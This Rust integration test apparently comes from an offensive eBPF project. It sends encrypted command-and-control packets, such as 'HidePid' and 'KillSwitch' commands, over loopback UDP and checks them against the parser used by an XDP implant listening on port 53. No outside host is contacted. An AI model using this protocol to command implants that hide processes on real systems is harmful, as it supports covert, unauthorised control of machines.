//! Loopback integration test: sends a C2 payload through a real UDP socket
//! and verifies the received bytes with the real user-space parser
//! (`common::c2_parse::parse_c2_packet`), proving wire compatibility with the
//! XDP receiver in `offense-ebpf/src/c2.rs`.

use aegis_c2::{build_c2_payload, build_command_payload, wrap_payload_in_frame, CommandKind};
use common::c2_parse::parse_c2_packet;
use common::{CommandPayload, C2_CHACHA20_KEY};
use std::net::UdpSocket;

#[test]
fn sent_datagram_parses_with_real_parser() {
    // Bind a loopback listener on an ephemeral port (binding :53 would need
    // root, which CI does not guarantee).
    let receiver = UdpSocket::bind("127.0.0.1:0").expect("bind loopback listener");
    let target = receiver.local_addr().expect("local addr");

    let command = build_command_payload(CommandKind::HidePid, Some("1234")).unwrap();
    let payload = build_c2_payload(&C2_CHACHA20_KEY, &[0xAB; 12], &command);

    // Put the packet on a real wire (loopback) via the same code path the CLI uses.
    let sender = UdpSocket::bind("127.0.0.1:0").expect("bind loopback sender");
    let sent = sender.send_to(&payload, target).expect("send datagram");
    assert_eq!(sent, payload.len());

    let mut buf = [0u8; 1024];
    let (len, _) = receiver.recv_from(&mut buf).expect("receive datagram");
    let received = &buf[..len];
    assert_eq!(received, payload.as_slice());

    // On the wire the kernel wrapped `received` in Ethernet/IPv4/UDP headers.
    // Rebuild that framing with the C2 destination port (53) — exactly what
    // the XDP program sees — and verify with the real parser.
    let frame = wrap_payload_in_frame(received, common::C2_PORT);
    let packet = parse_c2_packet(&frame).expect("real parser must accept the sent packet");

    assert!(packet.encrypted);
    assert_eq!(
        packet.command,
        CommandPayload {
            cmd_type: 1,
            arg1: 1234,
            arg2: 0,
            _pad: 0
        }
    );
}

#[test]
fn kill_switch_datagram_parses_with_real_parser() {
    let receiver = UdpSocket::bind("127.0.0.1:0").unwrap();
    let target = receiver.local_addr().unwrap();

    let command = build_command_payload(CommandKind::KillSwitch, None).unwrap();
    let payload = build_c2_payload(
        &C2_CHACHA20_KEY,
        &[
            0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C,
        ],
        &command,
    );

    let sender = UdpSocket::bind("127.0.0.1:0").unwrap();
    sender.send_to(&payload, target).unwrap();

    let mut buf = [0u8; 1024];
    let (len, _) = receiver.recv_from(&mut buf).unwrap();
    let frame = wrap_payload_in_frame(&buf[..len], 53);
    let packet = parse_c2_packet(&frame).unwrap();
    assert_eq!(packet.command.cmd_type, 5);
    assert_eq!(packet.command.arg1, 0);
}
